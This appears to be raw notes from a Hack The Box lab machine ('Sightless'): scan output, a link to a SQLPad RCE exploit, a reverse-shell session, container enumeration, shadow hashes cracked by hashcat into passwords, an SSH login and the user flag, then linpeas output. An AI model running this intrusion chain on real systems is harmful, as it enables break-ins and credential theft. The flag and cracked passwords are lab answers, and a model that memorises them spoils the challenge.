nmap output:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 10:53 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating NSE at 10:53
Completed NSE at 10:53, 0.00s elapsed
Initiating Ping Scan at 10:53
Scanning sightless.htb (10.129.215.169) [4 ports]
Completed Ping Scan at 10:53, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:53
Scanning sightless.htb (10.129.215.169) [1000 ports]
Discovered open port 80/tcp on 10.129.215.169
Discovered open port 21/tcp on 10.129.215.169
Discovered open port 22/tcp on 10.129.215.169
Completed SYN Stealth Scan at 10:53, 0.49s elapsed (1000 total ports)
Initiating Service scan at 10:53
Scanning 3 services on sightless.htb (10.129.215.169)
Completed Service scan at 10:54, 28.64s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against sightless.htb (10.129.215.169)
Retrying OS detection (try #2) against sightless.htb (10.129.215.169)
Retrying OS detection (try #3) against sightless.htb (10.129.215.169)
Retrying OS detection (try #4) against sightless.htb (10.129.215.169)
Retrying OS detection (try #5) against sightless.htb (10.129.215.169)
Initiating Traceroute at 10:54
Completed Traceroute at 10:54, 0.03s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:54
Completed Parallel DNS resolution of 1 host. at 10:54, 0.00s elapsed
NSE: Script scanning 10.129.215.169.
Initiating NSE at 10:54
Completed NSE at 10:54, 10.31s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 28.38s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Nmap scan report for sightless.htb (10.129.215.169)
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.215.169]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=11/15%Time=67377C9C%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
SF:0Server\)\x20\[::ffff:10\.129\.215\.169\]\r\n500\x20Invalid\x20command:
SF:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20t
SF:ry\x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/15%OT=21%CT=1%CU=33225%PV=Y%DS=2%DC=T%G=Y%TM=673
OS:77CE0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53
OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 24.580 days (since Mon Oct 21 21:59:40 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.06 ms 10.10.14.1
2   29.15 ms sightless.htb (10.129.215.169)

NSE: Script Post-scanning.
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Initiating NSE at 10:54
Completed NSE at 10:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.90 seconds
           Raw packets sent: 1124 (53.442KB) | Rcvd: 1099 (48.135KB)
```

gobuster output:
```bash
/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
/icones               (Status: 301) [Size: 178] [--> http://sightless.htb/icones/]
/index.html           (Status: 200) [Size: 4993]
/.                    (Status: 200) [Size: 4993]
```

nikto output:
```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.215.169
+ Target Hostname:    sightless.htb
+ Target Port:        80
+ Start Time:         2024-11-15 10:56:02 (GMT-6)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-11-15 11:00:12 (GMT-6) (250 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

whatweb output:
```bash
WhatWeb report for http://sightless.htb
Status    : 200 OK
Title     : Sightless.htb
IP        : 10.129.215.169
Country   : RESERVED, ZZ

Summary   : Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], X-UA-Compatible[IE=edge]
```

cewl output:
```bash
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Starting at http://sightless.htb
Visiting: http://sightless.htb, got response code 200
Attribute text found:
 

Found sales@sightless.htb on page mailto:sales@sightless.htb
Offsite link, not following: http://sqlpad.sightless.htb/
Offsite link, not following: https://www.froxlor.org/
Found sales@sightless.htb on page mailto:sales@sightless.htb
Writing words to file
Dumping email addresses to file

Sightless
server
management
Start
Contact
About
Services
database
solutions
databases
servers
seasoned
experience
services
SQLPad
Click
Froxlor
below
Hello
Empowering
Digital
Backbone
Welcome
premier
destination
comprehensive
Founded
mission
empower
businesses
seamless
efficient
infrastructure
dedicated
ensuring
always
optimized
secure
running
smoothly
understand
critical
today
digital
landscape
comprises
experts
years
administration
pride
ourselves
ability
provide
tailored
unique
needs
client
regardless
industry
Touch
service
section
start
users
connect
various
browser
Tailored
admin
software
Crafted
admins
streamlines
hosting
platform
Database
Server
Management
Providing
while
managing
systems
Interested
button
contact
sales
Footer
strat
Please
click
links
follow
CopyRight

Email addresses found
---------------------
sales@sightless.htb
```

sqlpad:
![image](https://github.com/user-attachments/assets/cb615dc1-b2d5-423c-980f-ece826eccd8e)

sqlpad rce: https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944

reverse shell output:
```bash
┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-hdqjptsfjk]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.34] from (UNKNOWN) [10.129.215.169] 48768
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami
whoami
root
root@c184118df0a6:/var/lib/sqlpad# ls -lah
ls -lah
total 200K
drwxr-xr-x 4 root root 4.0K Nov 15 16:40 .
drwxr-xr-x 1 root root 4.0K Mar 12  2022 ..
drwxr-xr-x 2 root root 4.0K Aug  9 11:17 cache
drwxr-xr-x 2 root root 4.0K Aug  9 11:17 sessions
-rw-r--r-- 1 root root 184K Nov 15 18:35 sqlpad.sqlite
root@c184118df0a6:/home/node# cd /
cd /
root@c184118df0a6:/# ls
ls
bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6:/# cd docker-entrypoint
cd docker-entrypoint
bash: cd: docker-entrypoint: Not a directory
root@c184118df0a6:/# cat docker-entrypoint
cat docker-entrypoint
#!/bin/bash
set -e
# This iterates any sh file in the directory and executes them before our server starts
# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
if [ -d "/etc/docker-entrypoint.d" ]; then
    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
    while IFS= read -r -d '' line; do 
        . "$line"
    done
fi
exec node /usr/app/server.js $@
root@c184118df0a6:/# cd /usr/app
cd /usr/app
root@c184118df0a6:/usr/app# ls
ls
app.js
auth-strategies
config.dev.env
docker-compose.yml
drivers
generate-test-db-fixture.js
lib
middleware
migrations
models
node_modules
package-lock.json
package.json
public
routes
sequelize-db
server.js
test
typedefs.js
root@c184118df0a6:/usr/app# 
```

linpeas output:
```bash
```

cdk output:
```bash
[  Information Gathering - System Info  ]
2024/11/15 20:38:33 current dir: /tmp
2024/11/15 20:38:33 current user: root uid: 0 gid: 0 home: /root
2024/11/15 20:38:33 hostname: c184118df0a6
2024/11/15 20:38:33 debian debian 10.11 kernel: 5.15.0-119-generic
2024/11/15 20:38:33 Setuid files found:
	/usr/bin/chfn
	/usr/bin/chsh
	/usr/bin/gpasswd
	/usr/bin/newgrp
	/usr/bin/passwd
	/bin/mount
	/bin/su
	/bin/umount

[  Information Gathering - Services  ]

[  Information Gathering - Commands and Capabilities  ]
2024/11/15 20:38:33 available commands:
	wget,find,node,npm,apt,dpkg,mount,fdisk,base64,perl
2024/11/15 20:38:33 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
	CapInh:	0000000000000000
	CapPrm:	00000000a00425fb
	CapEff:	00000000a00425fb
	CapBnd:	00000000a00425fb
	CapAmb:	0000000000000000
	Cap decode: 0x00000000a00425fb = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_AUDIT_WRITE,CAP_SETFCAP
[*] Maybe you can exploit the Capabilities below:

[  Information Gathering - Mounts  ]
0:43 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/L7ZKMJGDPM66AJUMM7OC6R4AMF:/var/lib/docker/overlay2/l/VKDEY6G5NFPWPTGJ7CR42Y3IXX:/var/lib/docker/overlay2/l/PGKS4DZDXD3SDVXKFEFEVRO3XL:/var/lib/docker/overlay2/l/VASNMPQBW2LWLK5R4SANZMAN3V:/var/lib/docker/overlay2/l/BRMVIB4H7ZWJSKBWSXCZG6NQGH:/var/lib/docker/overlay2/l/TDTAZTZTTMIHP4ELLG5TFCVPGQ:/var/lib/docker/overlay2/l/SY7KKADEXBP67CATU6OKQJFEMH:/var/lib/docker/overlay2/l/24CLUQ3NX3M5V742R264CL7LO4:/var/lib/docker/overlay2/l/POC2FH3R7PG2AYOVS4CRB2C5JW:/var/lib/docker/overlay2/l/KRMAYQOJUIV2NXMWQCXF6IONRG:/var/lib/docker/overlay2/l/SUSVG6PVN2JR5B5SDTRKZZSSKO:/var/lib/docker/overlay2/l/AKVKTM4UQL4647ATG2NAYQCCFT,upperdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/diff,workdir=/var/lib/docker/overlay2/9d0ce24f13f948e3582b108d503a1ae6025f910f0309225785c43ff85bbfa404/work
0:47 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
0:48 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:49 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
0:50 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
0:28 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - cgroup2 cgroup rw,nsdelegate,memory_recursiveprot
0:46 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
0:51 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/hostname /etc/hostname rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /var/lib/docker/containers/c184118df0a6eb770d018766ef8e32c948924b0ba77d85ec04a32e50cbafcb3a/hosts /etc/hosts rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
253:0 /root/docker-volumes/sqlpad-postgres /var/lib/sqlpad rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
0:47 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
0:47 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
0:52 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64
0:48 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:48 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:48 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
0:53 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64
0:54 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64

[  Information Gathering - Net Namespace  ]
	container net namespace isolated.

[  Information Gathering - Sysctl Variables  ]
2024/11/15 20:38:33 net.ipv4.conf.all.route_localnet = 0

[  Information Gathering - DNS-Based Service Discovery  ]
error when requesting coreDNS: lookup any.any.svc.cluster.local. on 8.8.8.8:53: read udp 172.17.0.2:37763->8.8.8.8:53: i/o timeout
error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 8.8.8.8:53: read udp 172.17.0.2:41804->8.8.8.8:53: i/o timeout

[  Discovery - K8s API Server  ]
2024/11/15 20:39:13 checking if api-server allows system:anonymous request.
err found while searching local K8s apiserver addr.:
err: cannot find kubernetes api host in ENV
	api-server forbids anonymous request.
	response:

[  Discovery - K8s Service Account  ]
load K8s service account token error.:
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory

[  Discovery - Cloud Provider Metadata API  ]
2024/11/15 20:39:14 failed to dial Alibaba Cloud API.
2024/11/15 20:39:15 failed to dial Azure API.
2024/11/15 20:39:16 failed to dial Google Cloud API.
2024/11/15 20:39:17 failed to dial Tencent Cloud API.
2024/11/15 20:39:18 failed to dial OpenStack API.
2024/11/15 20:39:19 failed to dial Amazon Web Services (AWS) API.
2024/11/15 20:39:20 failed to dial ucloud API.

[  Exploit Pre - Kernel Exploits  ]
2024/11/15 20:39:20 refer: https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```

deepce output:
```bash
==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. No
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ c184118df0a6
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.2 
[+] DNS Server(s) ........... 1.1.1.1 8.8.8.8 
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-119-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7763 64-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/wget
/bin/hostname
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh:	0000000000000000
CapPrm:	00000000a00425fb
CapEff:	00000000a00425fb
CapBnd:	00000000a00425fb
CapAmb:	0000000000000000
> This can be decoded with: "capsh --decode=00000000a00425fb"
[+] SSHD Service ............ Unknown (ps not installed)
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/root/docker-volumes/sqlpad-postgres /var/lib/sqlpad rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
[+] Possible host usernames ...  
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 root root  413 Mar 12  2022 /docker-entrypoint
-rwxr-xr-x 1 root root  39K Nov 15 20:25 /tmp/deepce.sh
-rwxr-xr-x 1 root root 809K Nov  1 04:29 /tmp/linpeas.sh
[+] Interesting files in root ........... Yes
/docker-entrypoint
[+] Passwords in common files ........... No
[+] Home directories .................... total 8.0K
drwxr-xr-x 2 michael michael 4.0K Aug  9 09:42 michael
drwxr-xr-x 1 node    node    4.0K Aug  9 09:42 node
[+] Hashes in shadow file ............... Yes
$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

Could not ping sweep, requires nmap or ping to be executable
==============================================================================================
```

tcp ports output:
```bash
root@c184118df0a6:/proc/sys/kernel# cat /proc/net/tcp | awk 'NR>1 {print $2}' | cut -d':' -f2 | xargs -I{} printf "%d\n" 0x{}
<2}' | cut -d':' -f2 | xargs -I{} printf "%d\n" 0x{}
3000
49048
34970
```

hashcat output(root):
```bash
Dictionary cache hit:
* Filename..: /home/hugo/Téléchargements/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJs...0Ra4b.
Time.Started.....: Tue Nov 19 04:26:09 2024 (10 secs)
Time.Estimated...: Tue Nov 19 04:26:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/hugo/Téléchargements/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3933 H/s (51.80ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39936/14344384 (0.28%)
Rejected.........: 0/39936 (0.00%)
Restore.Point....: 38912/14344384 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Host Generator + PCIe
Candidates.#1....: toutou -> promo2007
Hardware.Mon.#1..: Temp: 59c Util: 97%

Started: Tue Nov 19 04:26:08 2024
Stopped: Tue Nov 19 04:26:21 2024
```

hashcat output (user):
```bash
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Fri Nov 15 19:27:22 2024 (17 secs)
Time.Estimated...: Fri Nov 15 19:27:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./password-wordlist-2.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4032 H/s (50.04ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 69632/31305949 (0.22%)
Rejected.........: 0/69632 (0.00%)
Restore.Point....: 68608/31305949 (0.22%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
Candidate.Engine.: Device Generator
Candidates.#1....: waves -> broughton
Hardware.Mon.#1..: Temp: 59c Util: 96%

Started: Fri Nov 15 19:27:19 2024
Stopped: Fri Nov 15 19:27:41 2024
```

user flag:
```bash
└──╼ [★]$ ssh michael@10.129.245.73
michael@10.129.245.73's password: 
Last login: Tue Nov 19 02:31:13 2024 from 10.10.14.29
michael@sightless:~$ cat user.txt
a893c2597219f8e1a7de7a150b52fa45
```

linpeas output:
```bash
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root        1144  0.0  0.0   6896  2924 ?        Ss   02:27   0:00 /usr/sbin/cron -f -P
root        1162  0.0  0.1  10344  4060 ?        S    02:27   0:00  _ /usr/sbin/CRON -f -P
john        1187  0.0  0.0   2892  1040 ?        Ss   02:27   0:00  |   _ /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1666  0.0  0.0   7372  3568 ?        S    02:29   0:01  |       _ /bin/bash /home/john/automation/healthcheck.sh
john      110755  0.0  0.0   5772  1008 ?        S    23:50   0:00  |           _ sleep 60
root        1163  0.0  0.1  10344  4060 ?        S    02:27   0:00  _ /usr/sbin/CRON -f -P
john        1188  0.0  0.0   2892   980 ?        Ss   02:27   0:00      _ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1578  0.0  0.6  33660 24520 ?        S    02:29   1:01          _ /usr/bin/python3 /home/john/automation/administration.py
john        1579  0.4  0.3 33630172 15180 ?      Sl   02:29   6:07              _ /home/john/automation/chromedriver --port=53293
john        1590  0.8  2.8 34011320 113412 ?     Sl   02:29  10:39              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.8pSmd1 data:,
john        1596  0.0  1.4 34112452 56856 ?      S    02:29   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1592 --enable-crash-reporter
john        1613  0.6  3.0 34362328 122220 ?     Sl   02:29   8:39              |       |   _ /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1592 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1597  0.0  1.4 34112456 56160 ?      S    02:29   0:00              |       _ /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1592 --enable-crash-reporter
john        1642  3.7  6.4 1186799472 256988 ?   Sl   02:29  48:00              |       |   _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1592 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1731983236551341 --launc
john        1614  0.1  2.1 33900068 87076 ?      Sl   02:29   2:24              |       _ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1592 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,11361495564796128130,13613911764667587528,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter


╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Sep  3 08:19 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r-----   1 root root  898 Sep  3 11:55 froxlor
-rw-r--r--   1 root root  712 Jan 28  2022 php
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

╔══════════╣ Hostname, hosts and DNS
sightless
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37509         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:53293         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:36995         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   


╔══════════╣ Users with console
john:x:1001:1001:,,,:/home/john:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
root:x:0:0:root:/root:/bin/bash

══╣ PHP exec extensions
